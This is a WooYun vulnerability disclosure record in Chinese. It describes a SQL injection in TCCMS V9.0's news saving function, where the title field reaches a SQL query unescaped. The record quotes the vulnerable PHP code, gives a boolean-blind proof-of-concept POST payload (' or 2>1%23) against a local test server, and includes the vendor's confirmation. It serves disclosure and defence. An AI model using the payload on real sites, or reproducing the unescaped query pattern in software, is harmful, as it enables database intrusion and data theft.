{"id": 35376, "wybug_id": "wooyun-2015-0104075", "wybug_title": "TCCMSV9.0 最新版多处sql注入(GPC 条件）", "wybug_corp": "teamcen.com", "wybug_author": "路人甲", "wybug_date": "2015-03-31 14:13", "wybug_open_date": "2015-06-30 16:38", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-30：\t细节向公众公开  简要描述： RT 详细说明：  在app/controller/news.class.php中\npublic function saveOrUpdate() {\t\t$this->userIsLogin ();\t\t$powerObj = M('power');\t\t$groupObj = M('group');        $fieldObj = M(\"field\");\t\t$_Obj = M($this->objName);\t\t$newsObj = M(\"content\");\t\t$msgObj = new Msg();\t\t//栏目发布权限判断\t\t$userGroupId = $powerObj->getUserGroupId();\t\t$groupObj->load($userGroupId);\t\t$postCategoryAry = explode(\",\", $groupObj->post);\t\t$_Obj->classid = $_POST['info']['pid'];\t\tif (!Authen::isAdmin() && !in_array($_Obj->classid, $postCategoryAry)) {\t\t\t$msgObj->addMsg('error', Config::lang(\"NOTPOWERADDNEWSTHISCATEGORY\"));\t\t}        \t\t//表单数据获取\t\t$_Obj->create();\t\t$newsObj->create();.....$_Obj->haveDoubleRow($msgObj,\"title\", Config::lang(\"TITLECANNOTDOUBLE\"));\n这里程序先做了登陆以及发表文章的权限判断。然后程序执行了表单数据获取操作：$_Obj->create();\npublic function create($datas = '') {        $data = array();        $data = $datas;        if (empty($data)) {            $data = $_POST['info'];        } elseif (is_object($data)) {            $data = get_object_vars($data);        } elseif (!is_array($data)) {        \t$msg = Config::lang(\"ILLEGALDATA\");            exit($msg);        }        if (empty($_POST['info']) && empty($data)) { return false; }        $fieldsType = $this->types; //字段和默认值        $fieldsName = $this->fields; //字段和类型        $formKeyAry = array_keys($data); //post过来的所有$key        /* @var $key type */        foreach ($formKeyAry as $key) {            if (array_key_exists($key, $this->fields)) {                $val = isset($data[$key]) ? $data[$key] : NULL;                if (is_scalar($val)) {                    if (false !== strpos($fieldsType[$key], 'int')) {                        $val = intval($val);                    } elseif (false !== strpos($fieldsType[$key], 'float') || false !== strpos($fieldsType[$key], 'double')) {                        $val = floatval($val);                    }                }                if (!is_null($val)) {                    $this->$key = StringUtil::new_html_special_chars($val);                }                if (($data[$key] == \"\" || $data[$key] == NULL || $data[$key] === 0) && $fieldsName[$key] != \"\") {                    $this->$key = $fieldsName[$key];                }            }        }        return $this;    }\n我们发现程序从$_POST['info'] 逐一获取了key/value的值，并最终保存为$this->$key =$value。并且在中间过程中做了html编码，并没有做转义。继续看之前的方法，程序后来执行了$_Obj->haveDoubleRow($msgObj,\"title\", Config::lang(\"TITLECANNOTDOUBLE\"));\npublic function haveDoubleRow($msgObj,$cloum,$errorMsg) {    \t$sql = \"select * from \" . $this->table . \" where \".$cloum.\" = '\".$this->$cloum.\"'\";    \t$pri = $this->PRI;    \t$rowNum = empty($this->$pri) ? 1 : 2;    \t$ifExists = $this->ifExists($sql,$rowNum);    \tif ($ifExists) {    \t\t$msgObj->addMsg('error', $errorMsg);    \t}    \treturn $ifExists;    }\n这里面$column 值就是title,所以$this->$cloum就是$this->title,也就是$_POST[info][title]的值。这样就等于没有进行转义就带入到了sql语句中执行了此处可以使用boolen型盲注,当sql语句获取到数据的时候会提示title已经存在，利用这个可以很方便的进行sql注入POC：http://192.168.152.160/index.php?ac=news_saveOrUpdatePOST：info[title]=' or 2>1%23&info[pid]=1&info[photo_s]=234&info[photo]=&info[smallmemo]=23&smallpic=1&smallmemo=1&info[id]=&info[content]=<p>234<br/></p>当注入info[title]=' or 2=1%23时，会添加成功\n\n当注入info[title]=' or 1=1%23时，会提示标题重复\n\n   漏洞证明：  http://192.168.152.160/index.php?ac=news_saveOrUpdatePOST：info[title]=' or 2>1%23&info[pid]=1&info[photo_s]=234&info[photo]=&info[smallmemo]=23&smallpic=1&smallmemo=1&info[id]=&info[content]=<p>234<br/></p>当注入info[title]=' or 2=1%23时，会添加成功\n\n当注入info[title]=' or 1=1%23时，会提示标题重复\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-01 16:37 厂商回复： 太细心了，顶你 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-07 20:01 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  顶你    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}